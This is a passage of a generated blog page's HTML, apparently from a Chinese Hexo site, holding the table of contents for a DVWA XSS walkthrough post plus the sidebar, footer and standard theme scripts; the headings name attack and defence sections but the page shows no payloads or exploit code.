href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E6%B7%86"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：大小写混淆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：使用其他标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：双写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">4.5.4.</span> <span class="nav-text">方法4：事件处理器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E4%BD%BF%E7%94%A8img%E6%A0%87%E7%AD%BE"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：使用img标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%BD%BF%E7%94%A8svg%E6%A0%87%E7%AD%BE"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：使用svg标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BD%BF%E7%94%A8body%E6%A0%87%E7%AD%BE"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：使用body标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A%E4%BD%BF%E7%94%A8iframe"><span class="nav-number">5.5.4.</span> <span class="nav-text">方法4：使用iframe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A%E4%BD%BF%E7%94%A8input"><span class="nav-number">5.5.5.</span> <span class="nav-text">方法5：使用input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%956%EF%BC%9AHTML5%E6%96%B0%E6%A0%87%E7%AD%BE"><span class="nav-number">5.5.6.</span> <span class="nav-text">方法6：HTML5新标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81%EF%BC%88%E6%9C%80%E9%87%8D%E8%A6%81%EF%BC%89"><span class="nav-number">7.1.1.</span> <span class="nav-text">1. 输出编码（最重要）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E4%B8%8D%E5%90%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%BC%96%E7%A0%81"><span class="nav-number">7.1.2.</span> <span class="nav-text">2. 不同上下文使用不同编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89"><span class="nav-number">7.1.3.</span> <span class="nav-text">3. 内容安全策略（CSP）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%88%E8%BE%85%E5%8A%A9%EF%BC%89"><span class="nav-number">7.1.4.</span> <span class="nav-text">4. 输入验证（辅助）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-HttpOnly-Cookie"><span class="nav-number">7.1.5.</span> <span class="nav-text">5. HttpOnly Cookie</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">框架层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Laravel%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.2.1.</span> <span class="nav-text">Laravel示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#React%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.2.2.</span> <span class="nav-text">React示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">架构层面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8XSS-Payload%E9%9B%86%E5%90%88"><span class="nav-number">9.</span> <span class="nav-text">常用XSS Payload集合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80Payload"><span class="nav-number">9.1.</span> <span class="nav-text">基础Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">9.2.</span> <span class="nav-text">事件处理器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML5%E6%A0%87%E7%AD%BE"><span class="nav-number">9.3.</span> <span class="nav-text">HTML5标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaScript%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">9.4.</span> <span class="nav-text">JavaScript伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">9.5.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E7%AA%83%E5%8F%96"><span class="nav-number">9.6.</span> <span class="nav-text">Cookie窃取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
